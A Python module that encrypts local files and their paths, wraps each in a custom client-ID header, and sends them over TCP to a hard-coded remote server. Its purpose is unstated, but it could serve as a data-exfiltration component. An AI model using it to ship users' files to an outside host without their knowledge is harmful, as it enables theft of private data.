from datetime import datetime, timedelta
from os import walk
from time import sleep
import pathlib

import socket
import logging

import crypto_utils

CONNECTION_SERVER = "www2.darkage.io"

HEADER_PORTION_CLIENT_LEN = 16
HEADER_PORTION_PATH_LEN   = 512
HEADER_PORTION_SIZE_LEN   = 32

#I love you, T :)
DELIMITER="~||~TWT~||~"

def ship_file_to_server(client_id,path,port):
    encrypted_content, encrypted_size = crypto_utils.encrypt_file(path)
    encrypted_path, encrypted_path_size = crypto_utils.encrypt_content(path)

    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server_address = (CONNECTION_SERVER,port)

    logging.log(logging.INFO,"connecting to %s port %s" % server_address)
    sock.connect(server_address)
    try:
        dump_file_info(path,encrypted_size)
        message = wrap_file_for_delivery(
            client_id,
            encrypted_path,
            encrypted_content,
            encrypted_size
        )
        
        sock.sendall(message)

        #TODO: server response to client??
        #maybe respond with hash as verification check?
        #or is the security of tcp enough?

    finally:
        logging.log(logging.INFO,"closing socket")
        sock.close()

    sleep(1)

def wrap_file_for_delivery(client_id,path,content,content_size):
    # PACKET STRUCTURE
    # +-----------------------------------------+
    # | HEADER       = 560 bytes                |
    # | DELIMITER    =  11 bytes                |
    # | CONTENT      =   n bytes*               |
    # | *content size defined                   |
    # |  in size field of header (offset 528)   |
    # +-----------------------------------------+
    # content begins at offset 571
    wrapped_header = wrap_header(client_id,path,content_size)
    return wrapped_header + DELIMITER.encode('ascii') + content

def wrap_header(client_id,path,size):
    # HEADER PACKET BREAKDOWN
    # +-----------------------------------------+
    # | client_id    -> padded to 16 bytes      |
    # | path         -> padded to 512 bytes     |
    # | size of file -> padded to 32 bytes      |
    # +-----------------------------------------+
    # Total header size: 560 bytes
    padded_client_id = pad_client_id(client_id)
    padded_path      = pad_path(path)
    padded_size      = pad_size(size)

    return padded_client_id + padded_path + padded_size

def pad_client_id(client_id):
    len_to_pad = HEADER_PORTION_CLIENT_LEN - len(str(client_id))
    logging.log(logging.INFO,"adding %d characters to client id %s" % (len_to_pad,client_id))
    return str(client_id).encode('ascii') + ('\x00' * len_to_pad).encode('ascii')

def pad_path(path):
    len_to_pad = HEADER_PORTION_PATH_LEN - len(str(path))
    logging.log(logging.INFO,"adding %d characters to path %s" % (len_to_pad,path))
    return str(path).encode('ascii') + ('\x00' * len_to_pad).encode('ascii')

def pad_size(size):
    len_to_pad = HEADER_PORTION_SIZE_LEN - len(str(size))
    logging.log(logging.INFO,"adding %d characters to size %s" % (len_to_pad,size))
    return str(size).encode('ascii') + ('\x00' * len_to_pad).encode('ascii')

def dump_file_info(path,encrypted_size):
    logging.log(logging.INFO,"==== SENDING FILE : INFO ====")
    logging.log(logging.INFO,"\tPATH: %s" %path)
    logging.log(logging.INFO,"\tENCRYPTED SIZE: %d" %encrypted_size)
